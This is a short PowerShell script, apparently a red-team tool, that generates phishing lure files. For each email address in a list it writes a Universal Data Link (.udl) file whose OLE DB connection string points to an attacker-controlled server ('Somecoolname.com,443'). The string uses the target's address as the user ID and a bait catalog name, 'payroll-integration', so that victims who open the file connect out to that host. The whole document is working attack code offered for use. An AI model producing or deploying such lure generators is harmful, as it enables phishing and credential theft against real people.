# Script to generate UDL files for phishing
# Author: Oddvar Moe
# June 28, 2024
# 1.0

# Server to connect to
$serveraddress = "Somecoolname.com,443"
# Path to output the UDL files
$path = "c:\folder\"
# Path to userlist - Format is one email address per line - ex: john.smith@test.com
$userfilepath = "c:\folder\userlist.txt"
# Prefix UDL files
$prefixudl = "connection_test_"

$collection = get-content $userfilepath
foreach ($item in $collection)
{
    $file = $path+$prefixudl+$item.replace('@', '_')+".udl"    
    
    # create file
    New-Item $file -ItemType File
    Add-Content $file ("[oledb]") -Encoding Unicode
    Add-Content $file ("; Everything after this line is an OLE DB initstring") -Encoding Unicode
    Add-Content $file ("Provider=SQLOLEDB.1;Persist Security Info=False;User ID=$item;Initial Catalog=payroll-integration;Data Source=$serveraddress") -Encoding Unicode
}